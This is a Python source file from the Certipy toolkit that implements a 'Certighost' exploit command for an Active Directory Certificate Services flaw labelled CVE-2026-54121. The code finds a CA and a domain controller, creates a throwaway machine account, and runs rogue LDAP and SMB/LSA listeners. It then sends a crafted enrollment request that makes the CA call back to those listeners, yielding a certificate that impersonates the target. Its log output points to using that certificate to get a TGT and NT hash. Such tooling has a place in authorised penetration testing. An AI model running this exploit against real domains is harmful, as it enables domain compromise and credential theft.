"""Certighost (CVE-2026-54121) exploitation command."""

import argparse
import copy
import random
import secrets
import string
from typing import Optional, Tuple

from impacket.dcerpc.v5.dtypes import RPC_SID
from ldap3.utils.conv import escape_filter_chars

from certipy.commands.account import Account
from certipy.lib.certighost import (
    CertighostListenerManager,
    RogueLDAP,
    SMBLSAListener,
    check_listener_ports_available,
    detect_listener_ip,
    password_to_nthash,
)
from certipy.lib.ldap import LDAPConnection, LDAPEntry
from certipy.lib.logger import logging
from certipy.lib.req import Request
from certipy.lib.target import Target


class Certighost:
    """Coordinate the controlled chase endpoint and crafted enrollment request."""

    def __init__(
        self,
        target: Target,
        ca: Optional[str] = None,
        template: str = "Machine",
        listener: Optional[str] = None,
        target_account: Optional[str] = None,
        computer_name: Optional[str] = None,
        computer_pass: Optional[str] = None,
        computer_hash: Optional[str] = None,
        no_cleanup: bool = False,
        out: Optional[str] = None,
        **kwargs,  # type: ignore
    ) -> None:
        self.target = target
        self.ca = ca
        self.template = template
        self.listener = listener
        self.target_account = target_account
        self.computer_name = computer_name
        self.computer_password = computer_pass
        self.computer_hash = computer_hash
        self.no_cleanup = no_cleanup
        self.out = out
        self.kwargs = kwargs
        self._connection: Optional[LDAPConnection] = None
        self.created_computer = False
        self._temporary_account: Optional[Account] = None

    @property
    def connection(self) -> LDAPConnection:
        if self._connection is None:
            self._connection = LDAPConnection(self.target)
            self._connection.connect()
        return self._connection

    def _discover_ca(self) -> Tuple[str, str, str]:
        ca_filter = "(objectClass=pKIEnrollmentService)"
        if self.ca:
            ca_filter = (
                "(&(objectClass=pKIEnrollmentService)"
                f"(cn={escape_filter_chars(self.ca)}))"
            )
        results = self.connection.search(
            ca_filter,
            search_base=(
                "CN=Enrollment Services,CN=Public Key Services,CN=Services,"
                f"{self.connection.configuration_path}"
            ),
            attributes=["cn", "dNSHostName"],
        )
        if not results:
            raise RuntimeError(
                f"Could not find Certificate Authority {self.ca!r}"
                if self.ca
                else "Could not discover a Certificate Authority"
            )
        if len(results) > 1 and not self.ca:
            names = ", ".join(str(result.get("cn")) for result in results)
            raise RuntimeError(f"Multiple CAs found ({names}); specify -ca")
        entry = results[0]
        ca_name = str(entry.get("cn"))
        ca_host = str(entry.get("dNSHostName"))
        return ca_name, ca_host, self.target.resolver.resolve(ca_host)

    def _discover_target(self) -> LDAPEntry:
        if self.target_account:
            account = self.target_account
            if not account.endswith("$"):
                account += "$"
            search_filter = (
                "(&(objectCategory=computer)"
                f"(sAMAccountName={escape_filter_chars(account)}))"
            )
        else:
            search_filter = (
                "(&(objectCategory=computer)"
                "(userAccountControl:1.2.840.113556.1.4.803:=8192))"
            )
        results = self.connection.search(
            search_filter,
            attributes=["sAMAccountName", "dNSHostName", "objectSid"],
        )
        if not results:
            raise RuntimeError(
                f"Could not find target computer {self.target_account!r}"
                if self.target_account
                else "Could not discover a Domain Controller target"
            )
        return results[0]

    def _domain_guid(self) -> bytes:
        results = self.connection.search(
            "(objectClass=domain)",
            search_base=self.connection.default_path,
            attributes=["objectGUID"],
        )
        if not results:
            return b"\x00" * 16
        raw_guid = results[0].get_raw("objectGUID")
        if isinstance(raw_guid, list) and raw_guid:
            raw_guid = raw_guid[0]
        return raw_guid if isinstance(raw_guid, bytes) else b"\x00" * 16

    @staticmethod
    def _sid_bytes(entry: LDAPEntry) -> bytes:
        raw_sid = entry.get_raw("objectSid")
        if isinstance(raw_sid, list) and raw_sid:
            raw_sid = raw_sid[0]
        if isinstance(raw_sid, bytes):
            return raw_sid
        sid = RPC_SID()
        sid.fromCanonical(str(entry.get("objectSid")))
        return sid.getData()

    def _prepare_computer(self) -> Tuple[str, str, str]:
        if self.computer_name:
            if not self.computer_password and not self.computer_hash:
                raise RuntimeError(
                    "-computer-name requires -computer-pass or -computer-hash"
                )
            name = self.computer_name
            if not name.endswith("$"):
                name += "$"
            password = self.computer_password or ""
            nthash = self.computer_hash or password_to_nthash(password)
            return name, password, nthash

        suffix = "".join(random.choices(string.ascii_uppercase, k=8))
        name = f"GHOST{suffix}$"
        password = f"CG{secrets.token_hex(10)}Aa1"
        account = Account(
            self.target,
            user=name,
            passw=password,
            connection=self.connection,
        )
        if not account.create_temporary():
            raise RuntimeError("Failed to create a machine account")
        self.created_computer = True
        self._temporary_account = account
        self.computer_name = name
        self.computer_password = password
        return name, password, password_to_nthash(password)

    def _cleanup(self) -> None:
        if not self.created_computer or not self.computer_name:
            return
        if self._temporary_account is not None:
            try:
                removed = self._temporary_account.close_temporary(
                    delete=not self.no_cleanup
                )
            except Exception as error:
                logging.warning(
                    f"Could not remove temporary machine account "
                    f"{self.computer_name!r}: {error}"
                )
                return
            if self.no_cleanup:
                logging.info(
                    f"Preserved temporary machine account {self.computer_name!r}"
                )
            elif removed:
                logging.info(
                    f"Removed temporary machine account {self.computer_name!r}"
                )
            return
        if self.no_cleanup:
            return

        computer = self.connection.get_user(self.computer_name, silent=True)
        if computer is None:
            return
        result = self.connection.delete(computer.get("distinguishedName"))
        if result["result"] == 0:
            logging.info(f"Removed temporary machine account {self.computer_name!r}")
        else:
            logging.warning(
                f"Could not remove temporary machine account {self.computer_name!r}: "
                f"{result['message']}"
            )

    def run(self) -> bool:
        if not self.target.dc_ip:
            raise RuntimeError("-dc-ip is required")

        target_entry = self._discover_target()
        target_sam = str(target_entry.get("sAMAccountName"))
        target_dns = str(target_entry.get("dNSHostName"))
        target_sid = self._sid_bytes(target_entry)
        ca_name, ca_host, ca_ip = self._discover_ca()
        listener = self.listener or detect_listener_ip(self.target.dc_ip)
        if not listener:
            raise RuntimeError("Could not detect listener IP; specify -listener")

        logging.info(f"Targeting {target_sam!r} ({target_dns})")
        logging.info(f"Using CA {ca_name!r} at {ca_host!r} ({ca_ip})")
        unavailable_ports = check_listener_ports_available()
        if unavailable_ports:
            ports = ", ".join(str(port) for port in unavailable_ports)
            raise RuntimeError(
                f"Required listener port(s) {ports} are unavailable. Stop the "
                "conflicting service and ensure this command has elevated privileges."
            )

        listeners: Optional[CertighostListenerManager] = None

        logging.info(f"CA callback address is {listener!r}")

        try:
            computer_name, computer_password, computer_hash = self._prepare_computer()
            domain = self.target.domain.lower()
            domain_sid = self.connection.domain_sid
            if not domain_sid:
                raise RuntimeError("Could not determine the domain SID")

            logging.info("Starting Certighost SMB/LSA and LDAP listeners")
            ldap_server = RogueLDAP(
                domain,
                computer_name,
                computer_hash,
                self.target.dc_ip,
                target_sid,
                target_dns,
                target_sam,
            )
            smb_server = SMBLSAListener(
                bind_address="0.0.0.0",
                domain=domain,
                domain_guid=self._domain_guid(),
                domain_sid=domain_sid,
                computer_name=computer_name,
                computer_hash=computer_hash,
                computer_password=computer_password,
                dc_ip=self.target.dc_ip,
            )
            listeners = CertighostListenerManager(ldap_server, smb_server)
            listeners.start()

            machine_target = copy.copy(self.target)
            machine_target.username = computer_name
            machine_target.password = computer_password or None
            machine_target.hashes = (
                f"{computer_hash}:{computer_hash}" if not computer_password else None
            )
            machine_target.lmhash = computer_hash
            machine_target.nthash = computer_hash
            machine_target.remote_name = ca_host
            machine_target.target_ip = ca_ip
            machine_target.do_kerberos = False

            output = self.out or target_sam.rstrip("$").lower()
            request = Request(
                machine_target,
                ca=ca_name,
                template=self.template,
                dns=f"{computer_name.rstrip('$')}.{domain}",
                additional_attributes=[f"cdc:{listener}", f"rmd:{target_dns}"],
                out=output,
                prompt_for_pending_key=False,
            )
            result = request.request()
            listeners.raise_if_failed()
            if not isinstance(result, tuple):
                logging.error(
                    "Certighost request failed. The CA may be patched, chase may "
                    "be disabled, or the selected template may be unsuitable."
                )
                return False
            _, saved_path = result
            logging.info(
                f"Certighost certificate obtained at {saved_path!r}. Use "
                f"'certipy auth -pfx {saved_path} -dc-ip {self.target.dc_ip}' "
                "to obtain a TGT and NT hash, or add '-ldap-shell' to open an "
                "LDAP shell."
            )
            return True
        finally:
            if listeners is not None:
                listeners.stop()
            self._cleanup()


def entry(options: argparse.Namespace) -> None:
    target = Target.from_options(options, dc_as_target=True)
    options.__delattr__("target")
    exploit = Certighost(target, **vars(options))
    _ = exploit.run()
